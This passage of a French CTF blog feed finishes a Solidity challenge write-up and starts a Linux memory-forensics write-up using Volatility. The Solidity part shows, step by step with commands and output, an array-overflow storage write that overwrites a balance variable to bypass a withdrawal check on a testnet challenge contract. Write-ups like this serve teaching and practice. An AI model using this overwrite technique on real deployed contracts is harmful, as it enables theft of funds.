&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getMoneyFromAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La taille en slot 1 a-t-elle changé ?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;myth read-storage &lt;span class=&quot;nt&quot;&gt;--rpc&lt;/span&gt; infura-ropsten 1 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
1: 0x0000000000000000000000000000000000000000000000000000000000000124
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;savingAccounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;savingAccounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accountNumber&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ce code a donc bien été exécutée, la taille vaut bien &lt;code class=&quot;highlighter-rouge&quot;&gt;0x124&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;D’après les ressources précédentes, on peut retrouver le numéro de slot ou est stocké notre &lt;code class=&quot;highlighter-rouge&quot;&gt;0x16&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;keccak256&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;abi.encodePacked&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;uint256&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt; + 0x123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;keccak256(abi.encodePacked(uint256(1)))&lt;/code&gt;: adresse du premier élément du tableau (&lt;code class=&quot;highlighter-rouge&quot;&gt;savingAccounts[0]&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x123&lt;/code&gt;: décalage par rapport à la première case du tableau&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;On trouve alors &lt;code class=&quot;highlighter-rouge&quot;&gt;80084422859880547211683076133703299733277748156566366325829078699459944779289&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;myth&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;storage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rpc&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;infura&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ropsten&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80084422859880547211683076133703299733277748156566366325829078699459944779289&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5&lt;/span&gt;

&lt;span class=&quot;mi&quot;&gt;80084422859880547211683076133703299733277748156566366325829078699459944779289&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000000000000000000000000000000000000000000000000000016&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On retrouve bien le &lt;code class=&quot;highlighter-rouge&quot;&gt;0x16&lt;/code&gt; que nous avons envoyé tout à l’heure.&lt;/p&gt;

&lt;h2 id=&quot;attack-4&quot;&gt;Attack&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;https://ethereum.stackexchange.com/questions/70409/solidity-array-overflow&quot;&gt;Array overflow&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;https://medium.com/@iphelix/chain-heist-writeup-4f008cd6d346&quot;&gt;Vehicle Registration System&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;Notre but va être de localiser la position du slot 0, étant donné que c’est ce dernier qui contient la valeur de &lt;code class=&quot;highlighter-rouge&quot;&gt;moneyAmount&lt;/code&gt;, qui je le rappelle vaut 0 pour le moment. Pour cela, nous allons faire un array overflow.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;moneyAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2000000&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le but de cette modification est de bypass le require de la fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;withdrawMoneyFromAccount()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;D’après les ressources, on peut avoir accès en écriture au slot 0 à &lt;code class=&quot;highlighter-rouge&quot;&gt;savingAccounts[2**256 - keccak256(abi.encodePacked(uint256(1)))]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;On trouve alors &lt;code class=&quot;highlighter-rouge&quot;&gt;4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Essayons alors d’écrire &lt;code class=&quot;highlighter-rouge&quot;&gt;0x456&lt;/code&gt; à cet index.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# valeur de moneyAmount&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;myth read-storage &lt;span class=&quot;nt&quot;&gt;--rpc&lt;/span&gt; infura-ropsten 0 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
0: 0x0000000000000000000000000000000000000000000000000000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;putMoneyOnAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0x456&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# valeur de moneyAmount&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;myth read-storage &lt;span class=&quot;nt&quot;&gt;--rpc&lt;/span&gt; infura-ropsten 0 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
0: 0x0000000000000000000000000000000000000000000000000000000000000456
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;moneyAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1110&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;

  &lt;p&gt;On peut aussi faire l’appel directement dans la console Javascript étant donné que &lt;code class=&quot;highlighter-rouge&quot;&gt;moneyAmount&lt;/code&gt;est un champ public.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;La valeur de &lt;code class=&quot;highlighter-rouge&quot;&gt;moneyAmount&lt;/code&gt;est bien passée de &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; à &lt;code class=&quot;highlighter-rouge&quot;&gt;0x456&lt;/code&gt;. Modifions encore cette valeur pour passer le require.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;putMoneyOnAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0xffffffff&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;myth read-storage &lt;span class=&quot;nt&quot;&gt;--rpc&lt;/span&gt; infura-ropsten 0 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
0: 0x00000000000000000000000000000000000000000000000000000000ffffffff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enfin pour respecter la seconde condition du require, nous devons appeler le fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;withdrawMoneyFromAccount&lt;/code&gt; avec en paramètre un numéro de compte qui respecte cette condition: &lt;code class=&quot;highlighter-rouge&quot;&gt;savingAccounts[accountNumber] &amp;gt;= 1&lt;/code&gt;, on peut réutiliser l’adresse du slot 0, cela a peu d’importance.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withdrawMoneyFromAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On peut alors récupérer le flag.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SANTA{Y0u_Fin4lLy_DiD_i7!!!}&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;remarques-1&quot;&gt;Remarques&lt;/h1&gt;

&lt;p&gt;Il est aussi possible d’utiliser directement l’IDE &lt;a href=&quot;https://remix.ethereum.org/&quot;&gt;Remix&lt;/a&gt; pour résoudre les challenges, ce dernier étant plus user-friendly. J’ai préféré débuter directement dans la console, pour mieux comprendre les mécanismes.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>sigsegv2</title>
   <link href="http://localhost:4000/ctf/2019/12/05/sigsegv2/"/>
   <updated>2019-12-05T00:00:00+01:00</updated>
   <id>http://localhost:4000/ctf/2019/12/05/sigsegv2</id>
   <content type="html">&lt;!--more--&gt;

&lt;summary&gt;&lt;h3 style=&quot;display: inline;&quot;&gt;Writeups&lt;/h3&gt;&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#10-questions-about-my-system&quot;&gt;10 questions about my system&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#je-rim-et-je-ram&quot;&gt;Je rim et je ram&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;10-questions-about-my-system&quot;&gt;10 questions about my system&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;Auteur: &lt;a href=&quot;https://pwn.by/noraj/&quot;&gt;noraj&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Difficulté estimée : moyen&lt;/p&gt;

&lt;p&gt;Format de Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{sha1(flag)}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Description :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;openSUSE Leap 15.1&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;4.12.14-lp151.28.32-default (4.12.14-lp151.28.32.1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Question n°1&lt;/strong&gt;: Quelle est la commande que noraj a utilisé à &lt;code class=&quot;highlighter-rouge&quot;&gt;2019-11-19 22:57:38 UTC+0000&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question n°2&lt;/strong&gt;: Quelle version de gcc a été utilisée pour compiler le kernel ? (string entière)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question n°3&lt;/strong&gt;: Quel est le message de debug à &lt;code class=&quot;highlighter-rouge&quot;&gt;1105416124.1&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question n°4&lt;/strong&gt;: Quelle est l’adresse IP de &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt; et son adresse MAC? (concatène la réponse)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question n°5&lt;/strong&gt;: Quelle est la 3ème bibliothèque chargée par &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd&lt;/code&gt; ? (chemin entier)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question n°6&lt;/strong&gt;: Quels sont le système de fichier et les options de montage de &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;? (concatène la réponse)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question n°7&lt;/strong&gt;: Quels sont le nom/pid du processus qui utilise le socket &lt;code class=&quot;highlighter-rouge&quot;&gt;UNIX 18707&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question n°8&lt;/strong&gt;: Quelle est la commande entière du pid 364 ?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question n°9&lt;/strong&gt;: Quel est l’invocation ID de bash ?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question n°10&lt;/strong&gt;: Quel est le PPID of &lt;code class=&quot;highlighter-rouge&quot;&gt;qmgr&lt;/code&gt; process ?&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;résolution&quot;&gt;Résolution&lt;/h2&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file chall.raw
chall.raw: ELF 64-bit LSB core file x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sh&lt;/span&gt; chall.raw
279M    chall.raw
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; ./chall.raw | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Linux version'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;uniq
  &lt;/span&gt;Patch-mainline tags that instead refer to a Linux version number,
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;    0.000000] Linux version 4.12.14-lp151.28.32-default &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;geeko@buildhost&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gcc version 7.4.1 20190905 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;gcc-7-branch revision 275407] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SUSE Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#1 SMP Wed Nov 13 07:50:15 UTC 2019 (6e1aaad)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Avec la description de ce challenge, on comprend rapidement ce que l’on doit faire: utiliser &lt;a href=&quot;https://github.com/volatilityfoundation/volatility&quot;&gt;Volatility&lt;/a&gt; afin d’analyser ce dump de mémoire RAM Linux.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The &lt;strong&gt;Volatility Framework&lt;/strong&gt; is a completely open collection of tools, implemented in Python under the GNU General Public License, for the extraction of digital artifacts from volatile memory (RAM) samples.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;volatility-et-profil&quot;&gt;Volatility et profil&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;Pour être capable d’analyser un dump de RAM il est nécessaire de fournir à Volatility ce que l’on appelle un &lt;strong&gt;profil&lt;/strong&gt;. Ce dernier permet à Volatility de comprendre l’&lt;strong&gt;organisation de la mémoire&lt;/strong&gt; du dump (structure de données, algorithmes et symboles à utiliser).&lt;/p&gt;

&lt;p&gt;Pour Linux, un profil est lié à une distribution ainsi qu’à une version de noyau. D’après la description du challenge, on peut voir que le dump provient d’une machine sous OpenSUSE version &lt;code class=&quot;highlighter-rouge&quot;&gt;15.1&lt;/code&gt; avec un kernel version &lt;code class=&quot;highlighter-rouge&quot;&gt;4.12.14-lp151.28.32-default (4.12.14-lp151.28.32.1)&lt;/code&gt;. Nous devons alors trouver un profil respectant exactement ces versions.&lt;/p&gt;

&lt;p&gt;Il existe une petite base de profils &lt;a href=&quot;https://github.com/volatilityfoundation/profiles&quot;&gt;ici&lt;/a&gt;, mais en allant dans &lt;code class=&quot;highlighter-rouge&quot;&gt;Linux &amp;gt; OpenSUSE &amp;gt; x64&lt;/code&gt;, on peut voir que les profils vont de la version &lt;code class=&quot;highlighter-rouge&quot;&gt;10.2&lt;/code&gt;à &lt;code class=&quot;highlighter-rouge&quot;&gt;13.1&lt;/code&gt; d’OpenSUSE…&lt;/p&gt;

&lt;p&gt;Même après quelques recherches, aucun profil pour OpenSUSE 15.1 n’est disponible.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nous devons alors créer notre propre profil pour continuer.&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;opensuse-151&quot;&gt;OpenSUSE 15.1&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;Pour pouvoir être en mesure d’analyser notre dump correctement, nous devons installer une &lt;a href=&quot;https://download.opensuse.org/distribution/leap/15.1/iso/&quot;&gt;OpenSUSE 15.1&lt;/a&gt; avec un kernel &lt;code class=&quot;highlighter-rouge&quot;&gt;4.12.14-lp151.28.32-default (4.12.14-lp151.28.32.1)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;On peut prendre la &lt;a href=&quot;https://download.opensuse.org/distribution/leap/15.1/iso/openSUSE-Leap-15.1-NET-x86_64.iso&quot;&gt;net install&lt;/a&gt; car plus légère à télécharger (125 MB).&lt;/p&gt;

&lt;p&gt;À l’étape &lt;code class=&quot;highlighter-rouge&quot;&gt;System Role&lt;/code&gt; de l’installation, on peut choisir une installation de type &lt;code class=&quot;highlighter-rouge&quot;&gt;Server&lt;/code&gt;, qui sera plus rapide à installer (car pas d’interface graphique).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# OpenSUSES 15.1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
Linux linux-ua2c 4.12.14-lp151.28.32-default &lt;span class=&quot;c&quot;&gt;#1 SMP Wed Nov 13 07:50:15 UTC 2019 (6e1aaad) x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
4.12.14-lp151.28.32-default
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Après installation, on peut voir que nous avons exactement la bonne version du noyau que nous voulions.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Contrairement à d’autres challenges semblables, où il est nécessaire de télécharger une version spécifique du kernel.&lt;/p&gt;
&lt;/blockquote&gt;

